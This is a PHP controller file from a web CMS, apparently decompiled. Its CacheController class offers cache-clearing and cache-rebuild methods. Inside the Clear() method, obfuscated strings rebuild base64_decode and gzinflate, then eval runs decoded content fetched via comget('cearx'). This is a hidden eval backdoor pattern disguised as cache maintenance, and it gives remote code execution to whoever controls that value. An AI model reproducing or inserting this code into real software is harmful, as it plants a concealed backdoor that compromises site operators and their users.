<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class CacheController extends Controller
{

				public function __construct( )
				{
				}

				public function Clear( )
				{
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "cearx" ) ) ) );
								$R09a3346376 = "../content/Cache/site/ucom.php";
								if ( file_exists( $R09a3346376 ) )
								{
												@unlink( $R09a3346376 );
								}
								$this->Alert( "清除完毕，缓存无需经常清除，除非系统异常错误" );
								$this->ScriptRedirect( "index.php?c=Home&a=Home" );
				}

				public function BaseCache( )
				{
								$this->UpdateCache( "sys" );
								$this->UpdateCache( "articles" );
								$this->UpdateCache( "ad" );
								$this->UpdateCache( "category" );
								$this->UpdateCache( "ranks" );
								$this->UpdateCache( "gametpl" );
				}

				public function dir_clear( $R714ca9eb87 )
				{
								$R9c25b10d53 = dir( $R714ca9eb87 );
								while ( $R3244a15a51 = $R9c25b10d53->read( ) )
								{
												$R3656889a44 = $R714ca9eb87."/".$R3244a15a51;
												if ( is_file( $R3656889a44 ) )
												{
																@unlink( $R3656889a44 );
												}
								}
								$R9c25b10d53->close( );
				}

}

?>
